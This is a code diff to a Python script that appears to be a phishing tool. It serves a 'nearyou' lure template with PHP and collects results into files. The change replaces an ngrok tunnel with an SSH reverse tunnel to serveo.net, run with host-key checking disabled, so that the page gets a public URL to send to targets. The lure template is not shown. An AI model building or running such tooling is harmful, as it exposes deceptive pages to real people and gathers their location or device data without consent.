@@ -18,12 +18,11 @@ swd = os.getcwd()
 os.chdir(swd)
 result = '{}/template/nearyou/php/result.txt'.format(swd)
 info = '{}/template/nearyou/php/info.txt'.format(swd)
-api = 'http://localhost:4040/api/tunnels'
 site = 'nearyou'
-ver = '1.1.0'
+ver = '1.1.1'
 
 if sys.version_info[0] >= 3:
-    raw_input = input
+	raw_input = input
 
 def banner():
 	os.system('clear')
@@ -39,7 +38,7 @@ def banner():
 
 def network():
 	try:
-		requests.get('http://www.google.com/', timeout = 5)
+		requests.get('https://github.com/', timeout = 5)
 		print (G + '[+]' + C + ' Checking Internet Connection...' + W, end='')
 		print (G + ' Working' + W + '\n')
 	except requests.ConnectionError:
@@ -68,43 +67,37 @@ def version():
 	else:
 		print (G + ' Up-to-date' + W)
 
-def ngrok():
+def serveo():
 	global api, site, swd
+	flag = False
 	print ('\n' + G + '[+]' + C + ' Starting PHP Server...' + W)
 	with open ('php.log', 'w') as phplog:
-		subp.Popen(['php', '-S', '0.0.0.0:80', '-t', '{}/template/'.format(swd)], stderr=phplog, stdout=phplog)
-	print ('\n' + G + '[+]' + C + ' Starting Ngrok...' + W + '\n')
-	subp.Popen(['./Ngrok/ngrok', 'http', '80'], stdin=subp.PIPE, stderr=subp.PIPE, stdout=subp.PIPE)
-	time.sleep(2)
+		subp.Popen(['php', '-S', '127.0.0.1:8080', '-t', '{}/template/'.format(swd)], stderr=phplog, stdout=phplog)
 
-	def geturl():
-		time.sleep(2)
-		global goturl, url
-		r1 = requests.get('{}'.format(api))
-		page = r1.content
-		json1 = json.loads(page)
-		items = json1['tunnels']
-		if not items:
-			geturl()
-		else:
-			for item in json1['tunnels']:
-				if item['proto'] == 'https':
-					url = item['public_url']
-					if '.ngrok.io' in url:
-						goturl = True
-					else:
-						goturl = False
-
-	geturl()
+	print ('\n' + G + '[+]' + C + ' Getting Serveo URL...' + W + '\n')
+	with open ('/tmp/serveo.txt', 'w') as tmpfile:
+		proc = subp.Popen(['ssh', '-oStrictHostKeyChecking=no', '-R', '80:localhost:8080', 'serveo.net'], stdout = tmpfile, stderr = tmpfile, stdin = subp.PIPE)
 
 	while True:
 		time.sleep(2)
-		if goturl == True:
-			print ( G + '[+]' + C + ' URL : ' + W + url + '/' + site + '/')
-			break
-		else:
-			print (R + '[-]' + C + ' Unable to Get Ngrok URL.' + W + '\n')
-			sys.exit()
+		with open ('/tmp/serveo.txt', 'r') as tmpfile:
+			try:
+				stdout = tmpfile.readlines()
+				if flag == False:
+					for elem in stdout:
+						if 'HTTP' in elem:
+							elem = elem.split(' ')
+							url = elem[4].strip()
+							url = url + '/{}/'.format(site)
+							print (G + '[+]' + C + ' URL : ' + W + url)
+							flag = True
+						else:
+							pass
+				elif flag == True:
+					break
+			except Exception as e:
+				print (e)
+				pass
 
 def wait():
 	printed = False
@@ -195,14 +188,13 @@ def quit():
 	global result
 	with open (result, 'w+'): pass
 	os.system('pkill php')
-	os.system('pkill ngrok')
 	exit()
 
 try:
 	banner()
 	network()
 	version()
-	ngrok()
+	serveo()
 	wait()
 	main()
 
